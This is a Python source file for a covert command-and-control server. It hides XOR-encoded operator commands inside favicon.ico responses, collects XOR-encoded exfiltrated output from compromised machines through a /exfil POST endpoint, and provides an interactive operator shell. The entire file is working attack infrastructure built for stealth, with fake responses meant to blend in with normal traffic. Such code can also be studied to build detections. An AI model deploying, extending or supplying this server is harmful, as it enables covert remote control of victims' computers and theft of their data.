import os
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

PAYLOAD_MARKER = b"__COVERT_DATA__"
XOR_KEY = 0x5A
CURRENT_COMMAND = ""

class StealthC2Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return # Keep console clean

    # DOWNSTREAM: Hands out commands via favicon
    def do_GET(self):
        global CURRENT_COMMAND
        if self.path == "/favicon.ico":
            if os.path.exists("favicon.ico"):
                with open("favicon.ico", "rb") as f:
                    clean_image = f.read()
                if CURRENT_COMMAND:
                    encrypted_bytes = bytes([ord(c) ^ XOR_KEY for c in CURRENT_COMMAND])
                    response_payload = clean_image + PAYLOAD_MARKER + encrypted_bytes
                else:
                    response_payload = clean_image
                try:
                    self.send_response(200)
                    self.send_header("Content-Type", "image/x-icon")
                    self.send_header("Content-Length", str(len(response_payload)))
                    self.end_headers()
                    self.wfile.write(response_payload)
                except ConnectionError:
                    pass
            else:
                self.send_error(404, "File Not Found")
        else:
            self.send_error(404, "Not Found")

    # UPSTREAM: Receives exfiltrated data (like the output of 'dir')
    def do_POST(self):
        if self.path == "/exfil":
            # Read the length of the incoming data package
            content_length = int(self.headers['Content-Length'])
            raw_post_data = self.rfile.read(content_length)
            
            # Simple XOR decoding of the returned data block
            decrypted_output = "".join([chr(b ^ XOR_KEY) for b in raw_post_data])
            
            print("\n" + "="*40 + " AGENT OUTPUT " + "="*40)
            print(decrypted_output)
            print("="*94)
            
            # Respond with a standard fake 200 OK text response to blend in
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"OK")

def start_web_server():
    server_address = ("", 8080)
    httpd = HTTPServer(server_address, StealthC2Handler)
    httpd.serve_forever()

def run_console():
    global CURRENT_COMMAND
    print("[*] Launching Two-Way Multithreaded C2 Server...")
    print("[-] Web service listening on port 8080. Enter commands below.")
    print("-" * 65)
    
    srv_thread = threading.Thread(target=start_web_server, daemon=True)
    srv_thread.start()
    
    while True:
        try:
            user_input = input("C2-Shell> ").strip()
            if user_input:
                if user_input.lower() == "exit":
                    break
                elif user_input.lower() == "clear":
                    CURRENT_COMMAND = ""
                    print("[*] Staging track cleared.")
                else:
                    CURRENT_COMMAND = user_input
                    print(f"[*] Command staged: '{CURRENT_COMMAND}'")
        except KeyboardInterrupt:
            break

if __name__ == "__main__":
    run_console()